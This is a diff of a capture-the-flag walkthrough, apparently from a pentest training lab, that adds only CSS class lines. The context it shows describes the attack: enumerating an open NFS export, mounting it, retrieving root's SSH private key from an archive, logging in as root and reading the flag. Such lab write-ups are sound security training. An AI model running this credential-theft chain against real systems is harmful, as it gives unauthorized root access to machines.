@@ -23,6 +23,7 @@ The scan revealed multiple open ports:
 The presence of RPCBind (111) and NFS (2049) indicates that the target is running an NFS service, which could allow remote file sharing.
 
 ![Walkthrough Step](/assets/img/ptgarage_pages/no_files_shared/page_1.png)
+{: .ms-4 }
 
 ### 2. NFS Share Enumeration
 To identify accessible NFS shares, the following command was used:
@@ -32,10 +33,12 @@ showmount -e 13.206.97.201
 # Export list for 13.206.97.201:
 # /var/share *
 ```
+{: .ms-4 }
 
 This shows that the `/var/share` directory is exported and accessible to **all hosts (*)**, which is a misconfiguration and a potential security risk.
 
 ![Walkthrough Step](/assets/img/ptgarage_pages/no_files_shared/page_2.png)
+{: .ms-4 }
 
 ### 3. Mounting the NFS Share
 Since the share is publicly accessible, it was mounted locally:
@@ -45,8 +48,10 @@ sudo mount -t nfs 13.206.97.201:/var/share /mnt
 ls /mnt
 # package.tar.gz
 ```
+{: .ms-4 }
 
 ![Walkthrough Step](/assets/img/ptgarage_pages/no_files_shared/page_3.png)
+{: .ms-4 }
 
 ### 4. Analyzing the Retrieved Archive
 After mounting the NFS share, the file `package.tar.gz` was downloaded and extracted. The archive contained the `/root/.ssh/` directory which included the root user's SSH keys:
@@ -58,6 +63,7 @@ After mounting the NFS share, the file `package.tar.gz` was downloaded and extra
 <!-- -->
 
 ![Walkthrough Step](/assets/img/ptgarage_pages/no_files_shared/page_4.png)
+{: .ms-4 }
 
 ### 5. Gaining SSH Access
 First, proper permissions were set on the private key:
@@ -65,12 +71,14 @@ First, proper permissions were set on the private key:
 ```bash
 chmod 600 id_ecdsa
 ```
+{: .ms-4 }
 
 Then, SSH access was attempted using the key:
 
 ```bash
 ssh -i id_ecdsa root@13.206.97.201
 ```
+{: .ms-4 }
 
 Access was granted as `root`. We then retrieved the flag:
 
@@ -78,5 +86,6 @@ Access was granted as `root`. We then retrieved the flag:
 cat /root/flag.txt
 # ctf{ahr2uipeaz8veiDez7ei0oe5ea7aem7A}
 ```
+{: .ms-4 }
 
 ---
